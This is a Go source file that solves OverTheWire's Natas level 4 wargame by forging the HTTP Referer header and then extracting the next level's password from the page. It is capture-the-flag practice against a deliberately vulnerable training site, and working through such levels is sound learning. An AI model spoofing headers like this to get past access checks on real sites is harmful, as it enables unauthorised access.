package levels

import (
	"io"
	"log"
	"net/http"
	"regexp"
)

func GetLevel5Password(password string) string {
	var username string = "natas4"
	client := &http.Client{}

	req, err := http.NewRequest("GET", "http://natas4.natas.labs.overthewire.org", nil)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Set("Referer", "http://natas5.natas.labs.overthewire.org/")
	req.SetBasicAuth(username, password)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)

	re := regexp.MustCompile(`The password for natas5 is (.*)`)
	match := re.FindStringSubmatch(s)
	natas5Password := match[1]

	return natas5Password
}
